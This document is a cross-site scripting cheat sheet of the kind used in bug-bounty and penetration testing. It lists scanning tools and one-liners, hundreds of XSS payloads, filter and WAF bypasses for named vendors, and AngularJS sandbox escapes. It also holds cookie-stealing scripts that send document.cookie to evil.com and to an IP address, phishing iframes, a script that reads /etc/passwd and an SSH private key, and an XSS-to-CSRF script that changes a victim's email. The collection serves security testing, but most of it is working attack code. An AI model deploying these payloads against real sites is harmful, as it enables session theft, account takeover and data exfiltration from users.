# XSS

{% embed url="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" %}

{% hint style="info" %}
Try XSS in every input field, host headers, url redirections, URI paramenters and file upload namefiles.

Actions: phising through iframe, cookie stealing, always try convert self to reflected.
{% endhint %}

## Tools

```bash
# https://github.com/hahwul/dalfox
dalfox url http://testphp.vulnweb.com/listproducts.php

# https://github.com/KathanP19/Gxss
# Replace every param value with word FUZZ
echo "https://target.com/some.php?first=hello&last=world" | Gxss -c 100

# XSpear
gem install XSpear
XSpear -u 'https://web.com' -a
XSpear -u 'https://www.web.com/?q=123' --cookie='role=admin' -v 1 -a -b https://six2dez.xss.ht -t 20
XSpear -u "http://testphp.vulnweb.com/search.php?test=query" -p test -v 1

# Xira
# https://github.com/xadhrit/xira
python3 xira.py -u url

# Hosting XSS
# surge.sh
npm install --global surge
mkdir mypayload
cd mypayload
echo "alert(1)" > payload.js
surge # It returns the url

# XSS vectors
https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45

# Payload list
https://github.com/m0chan/BugBounty/blob/master/xss-payload-list.txt

https://github.com/terjanq/Tiny-XSS-Payloads

# XSS to RCE
# https://github.com/shelld3v/JSshell

# Polyglots
# https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

# XSS browser
# https://github.com/RenwaX23/XSSTRON

# Blind
# https://github.com/hipotermia/vaya-ciego-nen
```

### Oneliners

```bash
# WaybackUrls
echo "domain.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | sort -u | dalfox pipe -b https://six2dez.xss.ht
# Param discovery based
paramspider -d target.com > /filepath/param.txt && dalfox -b https://six2dez.xss.ht file /filepath/param.txt 
# Blind XSS
cat target_list.txt | waybackurls -no-subs | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | qsreplace -a | dalfox pipe -b https://six2dez.xss.ht
# Reflected XSS
echo "domain.com" | waybackurls | gf xss | kxss
```

## XSS recopilation

### Basics

```markup
# Locators
'';!--"<XSS>=&{()}

# 101
<script>alert(1)</script>
<script>+-+-1-+-+alert(1)</script>
<script>+-+-1-+-+alert(/xss/)</script>
%3Cscript%3Ealert(0)%3C%2Fscript%3E
%253Cscript%253Ealert(0)%253C%252Fscript%253E
<svg onload=alert(1)>
"><svg onload=alert(1)>
<iframe src="javascript:alert(1)">
"><script src=data:&comma;alert(1)//
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
%5B'-alert(document.cookie)-'%5D
```

### By tag

```markup
# Tag filter bypass
<svg/onload=alert(1)>
<script>alert(1)</script>
<script     >alert(1)</script>
<ScRipT>alert(1)</sCriPt>
<%00script>alert(1)</script>
<script>al%00ert(1)</script>

# HTML tags
<img/src=x a='' onerror=alert(1)>
<IMG """><SCRIPT>alert(1)</SCRIPT>">
<img src=`x`onerror=alert(1)>
<img src='/' onerror='alert("kalisa")'>
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<BODY ONLOAD=alert('XSS')>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<SCRIPT SRC=http:/evil.com/xss.js?< B >
"><XSS<test accesskey=x onclick=alert(1)//test
<svg><discard onbegin=alert(1)>
<script>image = new Image(); image.src="https://evil.com/?c="+document.cookie;</script>
<script>image = new Image(); image.src="http://"+document.cookie+"evil.com/";</script>

# Other tags
<BASE HREF="javascript:alert('XSS');//">
<DIV STYLE="width: expression(alert('XSS'));">
<TABLE BACKGROUND="javascript:alert('XSS')">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<xss id=x tabindex=1 onactivate=alert(1)></xss>
<xss onclick="alert(1)">test</xss>
<xss onmousedown="alert(1)">test</xss>
<body onresize=alert(1)>”onload=this.style.width=‘100px’>
<xss id=x onfocus=alert(document.cookie)tabindex=1>#x’;</script>

# CharCode
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>

# Input already in script tag
@domain.com">user+'-alert`1`-'@domain.com

# Scriptless
<link rel=icon href="//evil?
<iframe src="//evil?
<iframe src="//evil?
<input type=hidden type=image src="//evil?

# Unclosed Tags
<svg onload=alert(1)//
```

### Blind

```markup
# Blind XSS
# https://github.com/LewisArdern/bXSS
# https://github.com/ssl/ezXSS
# https://xsshunter.com/

# Blind XSS detection
# Xsshunter payload in every field
# Review forms
# Contact Us pages
# Passwords(You never know if the other side doesn’t properly handle input and if your password is in View mode)
# Address fields of e-commerce sites
# First or Last Name field while doing Credit Card Payments
# Set User-Agent to a Blind XSS payload. You can do that easily from a proxy such as Burpsuite.
# Log Viewers
# Feedback Page
# Chat Applications
# Any app that requires user moderation
# Host header
# Why cancel subscription? forms
```

### Bypasses

````markup
# No parentheses
<script>onerror=alert;throw 1</script>
<script>throw onerror=eval,'=alert\x281\x29'</script>
<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
<script>location='javascript:alert\x281\x29'</script>
<script>alert`1`</script>
<script>new Function`X${document.location.hash.substr`1`}`</script>

# No parentheses and no semicolons
<script>{onerror=alert}throw 1</script>
<script>throw onerror=alert,1</script>
<script>onerror=alert;throw 1337</script>
<script>{onerror=alert}throw 1337</script>
<script>throw onerror=alert,'some string',123,'haha'</script>

# No parentheses and no spaces:
<script>Function`X${document.location.hash.substr`1`}```</script>

# Angle brackets HTML encoded (in an attribute)
“onmouseover=“alert(1)
‘-alert(1)-’

# If quote is escaped
‘}alert(1);{‘
‘}alert(1)%0A{‘
\’}alert(1);{//

# Embedded tab, newline, carriage return to break up XSS
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">

# RegEx bypass
<img src="X" onerror=top[8680439..toString(30)](1337)>

# Other
<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>: base64 value which is alert(‘XSS’)
````

### Encoded

```markup
# Unicode
<script>\u0061lert(1)</script>
<script>\u{61}lert(1)</script>
<script>\u{0000000061}lert(1)</script>

# Hex
<script>eval('\x61lert(1)')</script>

# HTML
<svg><script>&#97;lert(1)</script></svg>
<svg><script>&#x61;lert(1)</script></svg>
<svg><script>alert&NewLine;(1)</script></svg>
<svg><script>x="&quot;,alert(1)//";</script></svg>
\’-alert(1)//

# URL
<a href="javascript:x='%27-alert(1)-%27';">XSS</a>

# Double URL Encode
%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E

# Unicode + HTML
<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>

# HTML + URL
<iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe>
```

### Polyglots

````markup
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
-->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>
oNcliCk=alert(1)%20)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>%5Cx3csVg/<img/src/onerror=alert(2)>%5Cx3e
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(document.domain)//'>
javascript:alert();//<img src=x:x onerror=alert(1)>\";alert();//";alert();//';alert();//`;alert();// alert();//*/alert();//--></title></textarea></style></noscript></noembed></template></select></script><frame src=javascript:alert()><svg onload=alert()><!--
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg"> 
￼￼```
%3C!%27/!%22/!\%27/\%22/ — !%3E%3C/Title/%3C/script/%3E%3CInput%20Type=Text%20Style=position:fixed;top:0;left:0;font-size:999px%20*/;%20Onmouseenter=confirm1%20//%3E#
<!'/!”/!\'/\"/ — !></Title/</script/><Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm1 //>#
jaVasCript:/-//*\/'/"/*/(/ */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/ — !>\x3csVg/<sVg/oNloAd=alert()//>\x3e
">>
” ></plaintext></|><plaintext/onmouseover=prompt(1) >prompt(1)@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>’ →” > "></script>alert(1)”><img/id="confirm( 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'">">
" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
?msg=<img/src=`%00`%20onerror=this.onerror=confirm(1)
<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>
<sVg/oNloAd=”JaVaScRiPt:/**\/*\’/”\eval(atob(‘Y29uZmlybShkb2N1bWVudC5kb21haW4pOw==’))”> <iframe src=jaVaScrIpT:eval(atob(‘Y29uZmlybShkb2N1bWVudC5kb21haW4pOw==’))>
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert())//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouse over=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><imgsrc="http://i.imgur.com/P8mL8.jpg">

# No parenthesis, back ticks, brackets, quotes, braces
a=1337,b=confirm,c=window,c.onerror=b;throw-a

# Another uncommon
'-(a=alert,b="_Y000!_",[b].find(a))-'

# Common XSS in HTML Injection
<svg onload=alert(1)>
</tag><svg onload=alert(1)>
"></tag><svg onload=alert(1)>
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='
p=<svg/1='&q='onload=alert(1)>
p=<svg 1='&q='onload='/*&r=*/alert(1)'>
q=<script/&q=/src=data:&q=alert(1)>
<script src=data:,alert(1)>
# inline
"onmouseover=alert(1) //
"autofocus onfocus=alert(1) //
# src attribute
javascript:alert(1)
# JS injection
'-alert(1)-'
'/alert(1)//
\'/alert(1)//
'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
/alert(1)//\
/alert(1)}//\
${alert(1)}

# XSS onscroll
<p style=overflow:auto;font-size:999px onscroll=alert(1)>AAA<x/id=y></p>#y

# XSS filter bypasss polyglot:
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg"> 

" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText.fontsize(1)) }; x.open("GET","file:///home/reader/.ssh/id_rsa"); x.send(); </script>
" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///etc/passwd"); x.send(); </script>

# GO SSTI
{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}`

# Some XSS exploitations
- host header injection through xss
add referer: batman 
hostheader: bing.com">script>alert(document.domain)</script><"
- URL redirection through xss
document.location.href="http://evil.com"
- phishing through xss - iframe injection
<iframe src="http://evil.com" height="100" width="100"></iframe>
- Cookie stealing through xss
https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py
https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md
<script>var i=new Image;i.src="http://172.30.5.46:8888/?"+document.cookie;</script>
<img src=x onerror=this.src='http://172.30.5.46:8888/?'+document.cookie;>
<img src=x onerror="this.src='http://172.30.5.46:8888/?'+document.cookie; this.removeAttribute('onerror');">
-  file upload  through xss
upload a picturefile, intercept it, change picturename.jpg to xss paylaod using intruder attack
-  remote file inclusion (RFI) through xss
php?=http://brutelogic.com.br/poc.svg - xsspayload
- convert self xss to reflected one
copy response in a file.html -> it will work

# XSS to SSRF
<esi:include src="http://yoursite.com/capture" />

# XSS to LFI
<script>	x=new XMLHttpRequest;	x.onload=function(){		document.write(this.responseText)	};	x.open("GET","file:///etc/passwd");	x.send();</script>

<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<script>document.write('<iframe src=file:///etc/passwd></iframe>');</scrip>
````

## XSS in files

```markup
# XSS in filename:
"><img src=x onerror=alert(document.domain)>.gif

# XSS in metadata:
exiftool -FIELD=XSS FILE
exiftool -Artist=' "><img src=1 onerror=alert(document.domain)>' brute.jpeg
exiftool -Artist='"><script>alert(1)</script>' dapos.jpeg

# XSS in GIF Magic Number:
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
# If image can't load:
url.com/test.php?p=<script src=http://url.com/upload/img/xss.gif>

# XSS in png:
https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/

# XSS in PDF:
https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?m=1

# XSS upload filename:
cp somefile.txt \"\>\<img\ src\ onerror=prompt\(1\)\>
<img src=x onerror=alert('XSS')>.png
"><img src=x onerror=alert('XSS')>.png
"><svg onmouseover=alert(1)>.svg
<<script>alert('xss')<!--a-->a.png
"><svg onload=alert(1)>.gif

# XSS Svg Image upload
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert('XSS!');
   </script>
</svg>

# XSS svg image upload 2
# If you're testing a text editor on a system that you can also upload files to, try to embed an svg:
<iframe src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/movingcart_1.svg" frameborder="0"></iframe>
#If that works, upload an SVG with the following content and try rendering it using the text editor:
<svg xmlns="http://www.w3.org/2000/svg">
    <script>alert(document.domain)</script>
</svg>

# XSS in SVG 3:
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>

# XSS in XML
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>

# https://brutelogic.com.br/blog/file-upload-xss/

" ="" '></><script></script><svg onload"="alertonload=alert(1)"" onload=setInterval'alert\x28document.domain\x29'

# XSS in existent jpeg:
exiftool -Artist='"><svg onload=alert(1)>' xss.jpeg

# XSS in url (and put as header)
http://acme.corp/?redir=[URI_SCHEME]://gremwell.com%0A%0A[XSS_PAYLOAD]

# XSS in XML
<?xml version="1.0" encoding="UTF-8"?>
<html xmlns:html="http://w3.org/1999/xhtml">
<html:script>prompt(document.domain);</html:script>
</html>
```

## **DOM XSS**

```markup
<img src=1 onerror=alert(1)>
<iframe src=javascript:alert(1)>
<details open ontoggle=alert(1)>
<svg><svg onload=alert(1)>
data:text/html,<img src=1 onerror=alert(1)>
data:text/html,<iframe src=javascript:alert(1)>
<iframe src=TARGET_URL onload="frames[0].postMessage('INJECTION','*')">
"><svg onload=alert(1)>
javascript:alert(document.cookie)
\"-alert(1)}//
```

## **XSS to CSRF**

```markup
# Example:

# Detect action to change email, with anti csrf token, get it and paste this in a comment to change user email:

<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/email/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

## **AngularJS Sandbox**

```markup
# Removed in AngularJS 1.6
# Is a way to avoid some strings like window, document or __proto__.

# Without strings:
/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1

# With CSP:

<script>
location='https://your-lab-id.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>

# v 1.6 and up
{{$new.constructor('alert(1)')()}}
<x ng-app>{{$new.constructor('alert(1)')()}}

{{constructor.constructor('alert(1)')()}}
{{constructor.constructor('import("https://six2dez.xss.ht")')()}}
{{$on.constructor('alert(1)')()}}
{{{}.")));alert(1)//"}}
{{{}.")));alert(1)//"}}
toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,11 4,116,40,49,41)
```

## **XSS in JS**

```markup
# Inside JS script:
</script><img src=1 onerror=alert(document.domain)>
</script><script>alert(1)</script>

# Inside JS literal script:
'-alert(document.domain)-'
';alert(document.domain)//
'-alert(1)-'

# Inside JS that escape special chars:
If ';alert(document.domain)// is converted in \';alert(document.domain)//
Use \';alert(document.domain)// to obtain \\';alert(document.domain)//
\'-alert(1)//

# Inside JS with some char blocked:
onerror=alert;throw 1
/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27

# Inside {}
${alert(document.domain)}
${alert(1)}
```

## XSS Waf Bypasses

```markup
# Only lowercase block
<sCRipT>alert(1)</sCRipT>

# Break regex
<script>%0aalert(1)</script>

# Double encoding
%2522

# Recursive filters
<scr<script>ipt>alert(1)</scr</script>ipt>

# Inject anchor tag
<a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">

# Bypass whitespaces
<svg·onload=alert(1)>

# Change GET to POST request

# Imperva Incapsula
%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%25 23x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%25 26%2523x29%3B%22%3E
<img/src="x"/onerror="[JS-F**K Payload]">
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';><img/src=q onerror='new Function`al\ert\`1\``'>

# WebKnight
<details ontoggle=alert(1)>
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">

# F5 Big IP
<body style="height:1000px" onwheel="[DATA]">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
<body style="height:1000px" onwheel="[JS-F**k Payload]">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[JS-F**k Payload]">
<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">

# Barracuda WAF
<body style="height:1000px" onwheel="alert(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">

# PHP-IDS
<svg+onload=+"[DATA]"
<svg+onload=+"aler%25%37%34(1)"

# Mod-Security
<a href="j[785 bytes of (&NewLine;&Tab;)]avascript:alert(1);">XSS</a>
1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>

# Quick Defense:
<input type="search" onsearch="aler\u0074(1)">
<details ontoggle="aler\u0074(1)">

# Sucuri WAF
1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4

# Akamai
1%3C/script%3E%3Csvg/onload=prompt(document[domain])%3E
<SCr%00Ipt>confirm(1)</scR%00ipt>
# AngularJS
{{constructor.constructor(alert 1 )()}} 
```

## XSS Mindmap

![](../../.gitbook/assets/XSS2.png)
